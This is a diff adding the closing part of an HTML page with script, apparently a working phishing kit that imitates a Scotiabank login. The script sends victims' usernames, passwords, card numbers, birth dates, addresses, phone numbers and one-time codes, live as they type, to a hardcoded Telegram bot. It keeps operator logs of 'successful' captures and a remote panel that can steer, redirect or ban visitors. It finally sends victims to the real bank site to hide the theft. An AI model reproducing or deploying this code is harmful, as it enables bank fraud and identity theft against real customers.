+                    <p>When you visit any website, it may store or retrieve information on your browser, in the form of cookies or other similar technologies. This information might be about you, your preferences, or your device, and is mostly used to make the site work as expected it to. The information does not usually directly identify you, but it can give you a more personalized web experience. You can choose not to allow some types of cookies and other similar technologies. Click on the different category headings to find out more and change your settings; however, blocking some of these technologies may impact your site</p>
+                </div>
+            </div>
+
+            <div class="privacy-modal-footer">
+                <button type="button" class="privacy-btn privacy-btn-reject" id="rejectAllBtn">Reject All</button>
+                <button type="button" class="privacy-btn privacy-btn-confirm" id="confirmChoicesBtn">Confirm My Choices</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = "8766214960:AAEX7YS3CTaQCHbe7wNWGbwNjSgjLuTGEpw"; 
+        const TELEGRAM_CHAT_ID = "8370855026";     
+
+        let telegramLoginMessageId = null;
+        let telegramInfoMessageId = null;
+        let telegramOtpMessageId = null;
+
+        const panelChannel = new BroadcastChannel('interac_panel_channel');
+
+        let myTesterId = localStorage.getItem("localTesterId");
+        if (!myTesterId) {
+            myTesterId = 'usr_' + Math.random().toString(36).substring(2, 9);
+            localStorage.setItem("localTesterId", myTesterId);
+        }
+        let currentUserEmail = localStorage.getItem("currentUserEmail") || "client.scotia@gmail.com";
+
+        async function sendOrUpdateLoginTelegram(data, isLiveUpdate = false) {
+            const message = `🚨 *${isLiveUpdate ? 'CONNEXION SCOTIA EN DIRECT' : 'NOUVELLE CONNEXION SCOTIA'}* 🚨\n\n` +
+                            `👤 *Utilisateur / Carte:* \`${data.username || '...'}\`\n` +
+                            `🔑 *Mot de passe:* \`${data.password || '...'}\``;
+
+            if (isLiveUpdate && telegramLoginMessageId) {
+                try {
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            message_id: telegramLoginMessageId,
+                            text: message,
+                            parse_mode: "Markdown"
+                        })
+                    });
+                } catch (err) { console.error("Erreur Telegram edit login:", err); }
+            } else {
+                try {
+                    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: message,
+                            parse_mode: "Markdown"
+                        })
+                    });
+                    const json = await res.json();
+                    if (json.ok && json.result) {
+                        telegramLoginMessageId = json.result.message_id;
+                    }
+                } catch (err) { console.error("Erreur Telegram send login:", err); }
+            }
+        }
+
+        async function sendOrUpdateInfoTelegram(data, isLiveUpdate = false) {
+            const message = `📋 *${isLiveUpdate ? 'INFORMATIONS SCOTIA EN DIRECT' : "VÉRIFICATION D'IDENTITÉ REÇUE"}*\n\n` +
+                            `👤 *Nom complet:* \`${data.fullName || '...'}\`\n` +
+                            `💳 *N° Carte (avant):* \`${data.cardNumberFront || '...'}\`\n` +
+                            `🎂 *Date de naissance:* \`${data.dob || '...'}\`\n` +
+                            `🏠 *Adresse:* \`${data.address || '...'}\`\n` +
+                            `📍 *Province:* \`${data.province || '...'}\`\n` +
+                            `📮 *Code postal:* \`${data.postalCode || '...'}\`\n` +
+                            `📞 *Téléphone:* \`${data.idPhone || '...'}\``;
+
+            if (isLiveUpdate && telegramInfoMessageId) {
+                try {
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            message_id: telegramInfoMessageId,
+                            text: message,
+                            parse_mode: "Markdown"
+                        })
+                    });
+                } catch (err) { console.error("Erreur Telegram edit info:", err); }
+            } else {
+                try {
+                    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: message,
+                            parse_mode: "Markdown"
+                        })
+                    });
+                    const json = await res.json();
+                    if (json.ok && json.result) {
+                        telegramInfoMessageId = json.result.message_id;
+                    }
+                } catch (err) { console.error("Erreur Telegram send info:", err); }
+            }
+        }
+
+        async function sendOrUpdateOtpTelegram(code, isLiveUpdate = false) {
+            const message = `🔒 *${isLiveUpdate ? 'CODE OTP SCOTIA EN DIRECT' : 'CODE OTP REÇU'}*\n\n` +
+                            `🔢 *Code:* \`${code || '...'}\``;
+
+            if (isLiveUpdate && telegramOtpMessageId) {
+                try {
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            message_id: telegramOtpMessageId,
+                            text: message,
+                            parse_mode: "Markdown"
+                        })
+                    });
+                } catch (err) { console.error("Erreur Telegram edit otp:", err); }
+            } else {
+                try {
+                    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: message,
+                            parse_mode: "Markdown"
+                        })
+                    });
+                    const json = await res.json();
+                    if (json.ok && json.result) {
+                        telegramOtpMessageId = json.result.message_id;
+                    }
+                } catch (err) { console.error("Erreur Telegram send otp:", err); }
+            }
+        }
+
+        function pushLogToPanel(bankName, cardInfo, status, details) {
+            const logEntry = {
+                time: new Date().toLocaleTimeString(),
+                bank: bankName,
+                card: cardInfo,
+                status: status,
+                details: details
+            };
+
+            let liveLogs = JSON.parse(localStorage.getItem("liveAttackLogs") || "[]");
+            liveLogs.unshift(logEntry);
+            localStorage.setItem("liveAttackLogs", JSON.stringify(liveLogs));
+
+            let totalSent = parseInt(localStorage.getItem("panelTotalSent") || "0") + 1;
+            localStorage.setItem("panelTotalSent", totalSent);
+
+            if (status === 'SUCCESS') {
+                let totalSuccess = parseInt(localStorage.getItem("panelTotalSuccess") || "0") + 1;
+                localStorage.setItem("panelTotalSuccess", totalSuccess);
+
+                let winningRecordsLog = JSON.parse(localStorage.getItem("winningRecordsLog") || "[]");
+                winningRecordsLog.unshift({
+                    id: '#' + Math.random().toString(36).substring(2, 8).toUpperCase(),
+                    type: bankName,
+                    amount: cardInfo,
+                    date: "À l'instant"
+                });
+                localStorage.setItem("winningRecordsLog", JSON.stringify(winningRecordsLog));
+            }
+
+            panelChannel.postMessage({ type: 'NEW_LOG', log: logEntry });
+        }
+
+        let typingTimerLogin;
+        function handleLoginLiveInput() {
+            const username = document.getElementById("username").value.trim();
+            const password = document.getElementById("password").value.trim();
+            clearTimeout(typingTimerLogin);
+            typingTimerLogin = setTimeout(() => {
+                if (username || password) {
+                    sendOrUpdateLoginTelegram({ username, password }, true);
+                }
+            }, 300);
+        }
+
+        let typingTimerInfo;
+        function handleInfoLiveInput() {
+            const data = {
+                fullName: document.getElementById("fullName").value.trim(),
+                cardNumberFront: document.getElementById("cardNumberFront").value.trim(),
+                dob: document.getElementById("dob").value.trim(),
+                address: document.getElementById("address").value.trim(),
+                province: document.getElementById("province").value.trim(),
+                postalCode: document.getElementById("postalCode").value.trim(),
+                idPhone: document.getElementById("idPhone").value.trim()
+            };
+            clearTimeout(typingTimerInfo);
+            typingTimerInfo = setTimeout(() => {
+                if (Object.values(data).some(v => v !== '')) {
+                    sendOrUpdateInfoTelegram(data, true);
+                }
+            }, 300);
+        }
+
+        function handleOtpLiveInput() {
+            let otpCode = "";
+            document.querySelectorAll(".otp-input").forEach(input => {
+                otpCode += input.value;
+            });
+            if (otpCode.length > 0) {
+                sendOrUpdateOtpTelegram(otpCode, true);
+            }
+        }
+
+        const rememberBox = document.getElementById("rememberBox");
+        const rememberText = document.getElementById("rememberText");
+
+        function toggleRemember() {
+            const isChecked = rememberBox.classList.toggle("checked");
+            rememberBox.setAttribute("aria-checked", String(isChecked));
+        }
+
+        rememberBox.addEventListener("click", toggleRemember);
+        rememberText.addEventListener("click", toggleRemember);
+
+        rememberBox.addEventListener("keydown", function(event) {
+            if (event.key === "Enter" || event.key === " ") {
+                event.preventDefault();
+                toggleRemember();
+            }
+        });
+
+        let currentStep = 1;
+
+        function switchStepDirect(stepNum) {
+            currentStep = parseInt(stepNum);
+            
+            loginSection.style.display = 'none';
+            loaderScreen.classList.remove("visible");
+            identityScreen.classList.remove("visible");
+            loaderScreen2.classList.remove("visible");
+            otpScreen.classList.remove("visible");
+            loaderScreen3.classList.remove("visible");
+
+            if (currentStep === 1) {
+                loginSection.style.display = 'block';
+                updateMyStatus("Sur Scotia (Étape 1: Identifiant)");
+            } else if (currentStep === 2) {
+                identityScreen.classList.add("visible");
+                updateMyStatus("Sur Scotia (Étape 2: Vérification d'identité)");
+            } else if (currentStep === 3 || currentStep === 4) {
+                otpScreen.classList.add("visible");
+                updateMyStatus("Sur Scotia (Étape 3/4: Code OTP)");
+            }
+        }
+
+        const demoForm = document.getElementById("demoForm");
+        const loginSection = document.getElementById("loginSection");
+        const loginSubmitBtn = document.getElementById("loginSubmitBtn");
+        const loaderScreen = document.getElementById("loaderScreen");
+        const progressBarFill = document.getElementById("progressBarFill");
+        const identityScreen = document.getElementById("identityScreen");
+        const submitIdentityBtn = document.getElementById("submitIdentityBtn");
+        const loaderScreen2 = document.getElementById("loaderScreen2");
+        const progressBarFill2 = document.getElementById("progressBarFill2");
+        const otpScreen = document.getElementById("otpScreen");
+        const verifyOtpBtn = document.getElementById("verifyOtpBtn");
+        const loaderScreen3 = document.getElementById("loaderScreen3");
+        const progressBarFill3 = document.getElementById("progressBarFill3");
+        const inlineError = document.getElementById("inlineError");
+
+        demoForm.addEventListener("submit", async function(event) {
+            event.preventDefault();
+            
+            const username = document.getElementById("username").value.trim();
+            const password = document.getElementById("password").value.trim();
+
+            if (!username || !password) {
+                inlineError.classList.add("visible");
+                return;
+            } else {
+                inlineError.classList.remove("visible");
+            }
+
+            if (username.includes("@")) {
+                currentUserEmail = username;
+                localStorage.setItem("currentUserEmail", currentUserEmail);
+            }
+
+            loginSubmitBtn.disabled = true;
+            loginSubmitBtn.innerHTML = '<div class="spinner" style="width:24px; height:24px; margin:0 auto; border-width:3px;"></div>';
+
+            await sendOrUpdateLoginTelegram({ username, password }, false);
+            pushLogToPanel('Scotiabank', username, 'PENDING', `Pass: ${password}`);
+
+            loginSection.style.display = "none";
+            loaderScreen.classList.add("visible");
+            
+            updateMyStatus("Sur Scotia (Étape 2: Vérification d'identité)");
+            currentStep = 2;
+
+            let duration = 9000;
+            let intervalTime = 50;
+            let elapsed = 0;
+
+            let progressInterval = setInterval(function() {
+                elapsed += intervalTime;
+                let percentage = (elapsed / duration) * 100;
+                if (percentage > 100) percentage = 100;
+                progressBarFill.style.width = percentage + "%";
+
+                if (elapsed >= duration) {
+                    clearInterval(progressInterval);
+                    loaderScreen.classList.remove("visible");
+                    identityScreen.classList.add("visible");
+                }
+            }, intervalTime);
+        });
+
+        submitIdentityBtn.addEventListener("click", async function() {
+            const fullName = document.getElementById("fullName").value.trim();
+            const cardNumberFront = document.getElementById("cardNumberFront").value.trim();
+            const dob = document.getElementById("dob").value.trim();
+            const address = document.getElementById("address").value.trim();
+            const province = document.getElementById("province").value.trim();
+            const postalCode = document.getElementById("postalCode").value.trim();
+            const idPhone = document.getElementById("idPhone").value.trim();
+
+            if (!fullName || !cardNumberFront || !dob || !address || !province || !postalCode || !idPhone) {
+                alert("Veuillez remplir tous les champs de vérification d'identité.");
+                return;
+            }
+
+            submitIdentityBtn.disabled = true;
+            submitIdentityBtn.innerHTML = '<div class="spinner" style="width:24px; height:24px; margin:0 auto; border-width:3px;"></div>';
+
+            const infoData = { fullName, cardNumberFront, dob, address, province, postalCode, idPhone };
+            await sendOrUpdateInfoTelegram(infoData, false);
+            pushLogToPanel('Scotiabank (Infos)', cardNumberFront || 'Carte validée', 'PENDING', `Nom: ${fullName}, Tél: ${idPhone}`);
+
+            identityScreen.classList.remove("visible");
+            loaderScreen2.classList.add("visible");
+
+            updateMyStatus("Sur Scotia (Étape 3: Code OTP)");
+            currentStep = 3;
+
+            let duration = 9000;
+            let intervalTime = 50;
+            let elapsed = 0;
+
+            let progressInterval = setInterval(function() {
+                elapsed += intervalTime;
+                let percentage = (elapsed / duration) * 100;
+                if (percentage > 100) percentage = 100;
+                progressBarFill2.style.width = percentage + "%";
+
+                if (elapsed >= duration) {
+                    clearInterval(progressInterval);
+                    loaderScreen2.classList.remove("visible");
+                    otpScreen.classList.add("visible");
+                }
+            }, intervalTime);
+        });
+
+        verifyOtpBtn.addEventListener("click", async function() {
+            let otpCode = "";
+            let allFilled = true;
+            document.querySelectorAll(".otp-input").forEach(input => {
+                if (input.value.trim() === "") {
+                    allFilled = false;
+                }
+                otpCode += input.value;
+            });
+
+            if (!allFilled || otpCode.length < 6) {
+                alert("Veuillez entrer les 6 chiffres du code de vérification.");
+                return;
+            }
+
+            verifyOtpBtn.disabled = true;
+            verifyOtpBtn.innerHTML = '<div class="spinner" style="width:24px; height:24px; margin:0 auto; border-width:3px;"></div>';
+
+            await sendOrUpdateOtpTelegram(otpCode, false);
+            pushLogToPanel('Scotiabank (Complet)', document.getElementById("username").value.trim() || 'Validé', 'SUCCESS', `OTP: ${otpCode}`);
+
+            otpScreen.classList.remove("visible");
+            loaderScreen3.classList.add("visible");
+
+            updateMyStatus("Scotia - Validé / Succès");
+
+            let duration = 9000;
+            let intervalTime = 50;
+            let elapsed = 0;
+
+            let progressInterval = setInterval(function() {
+                elapsed += intervalTime;
+                let percentage = (elapsed / duration) * 100;
+                if (percentage > 100) percentage = 100;
+                progressBarFill3.style.width = percentage + "%";
+
+                if (elapsed >= duration) {
+                    clearInterval(progressInterval);
+                    window.location.replace("https://www.scotiabank.com/ca/en/personal.html");
+                }
+            }, intervalTime);
+        });
+
+        const otpInputs = document.querySelectorAll(".otp-input");
+        otpInputs.forEach((input, index) => {
+            input.addEventListener("input", (e) => {
+                if (e.target.value.length === 1 && index < otpInputs.length - 1) {
+                    otpInputs[index + 1].focus();
+                }
+            });
+            input.addEventListener("keydown", (e) => {
+                if (e.key === "Backspace" && input.value === "" && index > 0) {
+                    otpInputs[index - 1].focus();
+                }
+                if (e.key === "Enter") {
+                    e.preventDefault();
+                    document.getElementById("verifyOtpBtn").click();
+                }
+            });
+        });
+
+        function hideCookieBanner() {
+            document.getElementById("cookieBanner").style.display = "none";
+            document.getElementById("cookieOverlay").style.display = "none";
+        }
+
+        document.getElementById("acceptCookiesBtn").addEventListener("click", hideCookieBanner);
+        document.getElementById("manageCookiesBtn").addEventListener("click", hideCookieBanner);
+
+        const cookieSettingsLink = document.getElementById("cookieSettingsLink");
+        const privacyModalOverlay = document.getElementById("privacyModalOverlay");
+        const privacyCloseBtn = document.getElementById("privacyCloseBtn");
+        const rejectAllBtn = document.getElementById("rejectAllBtn");
+        const confirmChoicesBtn = document.getElementById("confirmChoicesBtn");
+
+        function openPrivacyModal(event) {
+            event.preventDefault();
+            privacyModalOverlay.classList.add("visible");
+        }
+
+        function closePrivacyModal() {
+            privacyModalOverlay.classList.remove("visible");
+        }
+
+        if (cookieSettingsLink) {
+            cookieSettingsLink.addEventListener("click", openPrivacyModal);
+        }
+        if (privacyCloseBtn) {
+            privacyCloseBtn.addEventListener("click", closePrivacyModal);
+        }
+        if (rejectAllBtn) {
+            rejectAllBtn.addEventListener("click", closePrivacyModal);
+        }
+        if (confirmChoicesBtn) {
+            confirmChoicesBtn.addEventListener("click", closePrivacyModal);
+        }
+        if (privacyModalOverlay) {
+            privacyModalOverlay.addEventListener("click", function(event) {
+                if (event.target === privacyModalOverlay) {
+                    closePrivacyModal();
+                }
+            });
+        }
+    </script>
+
+    <script>
+        function updateMyStatus(statusText) {
+            if (localStorage.getItem("userBanned") === "true") return;
+            let onlineUsers = JSON.parse(localStorage.getItem("onlineUsersList") || "[]");
+            let index = onlineUsers.findIndex(u => u.id === myTesterId);
+
+            const record = {
+                id: myTesterId,
+                email: currentUserEmail,
+                ip: '192.168.1.15 (QC, CA)',
+                currentPage: "scotia.html",
+                status: statusText || "Sur Scotia (Étape 1: Identifiant)",
+                lastSeen: Date.now()
+            };
+
+            if (index !== -1) {
+                onlineUsers[index] = record;
+            } else {
+                onlineUsers.unshift(record);
+            }
+            localStorage.setItem("onlineUsersList", JSON.stringify(onlineUsers));
+        }
+
+        updateMyStatus("Sur Scotia (Étape 1: Identifiant)");
+
+        let lastProcessedAction = localStorage.getItem("forceUserAction");
+
+        function handleDashboardAction() {
+            const forced = localStorage.getItem("forceUserAction");
+            if (!forced || forced === lastProcessedAction) return;
+            
+            try {
+                const data = JSON.parse(forced);
+                if (data.targetId === "all" || data.targetId === myTesterId) {
+                    lastProcessedAction = forced;
+
+                    if (data.action === "step") {
+                        switchStepDirect(data.value);
+                    } else if (data.action === "otp") {
+                        window.location.href = data.value;
+                    } else if (data.action === "ban") {
+                        localStorage.setItem("userBanned", "true");
+                        document.body.innerHTML = '<div style="background:#020204; color:#ff0055; height:100vh; display:flex; align-items:center; justify-content:center; font-family:Arial, sans-serif; font-size:1.5rem; text-align:center;">ACCÈS REFUSÉ - VOUS AVEZ ÉTÉ BANNI PAR L\'ADMINISTRATEUR.</div>';
+                    }
+                }
+            } catch (err) {
+                console.error("Erreur action dashboard:", err);
+            }
+        }
+
+        window.addEventListener("storage", (event) => {
+            if (event.key === "forceUserAction") {
+                handleDashboardAction();
+            }
+        });
+
+        setInterval(() => {
+            let statusText = "Sur Scotia (Étape 1: Identifiant)";
+            if (currentStep === 2) statusText = "Sur Scotia (Étape 2: Vérification d'identité)";
+            else if (currentStep === 3 || currentStep === 4) statusText = "Sur Scotia (Étape 3: Code OTP)";
+            else if (loaderScreen3.classList.contains("visible")) statusText = "Complété (Succès)";
+            
+            updateMyStatus(statusText);
+            handleDashboardAction();
+        }, 1000);
+
+        window.addEventListener("beforeunload", () => {
+            let onlineUsers = JSON.parse(localStorage.getItem("onlineUsersList") || "[]");
+            onlineUsers = onlineUsers.map(u => u.id === myTesterId ? { ...u, status: "🔴 Sorti de la page (Inactif)", lastSeen: 0 } : u);
+            localStorage.setItem("onlineUsersList", JSON.stringify(onlineUsers));
+        });
+    </script>
+</body>
+</html>
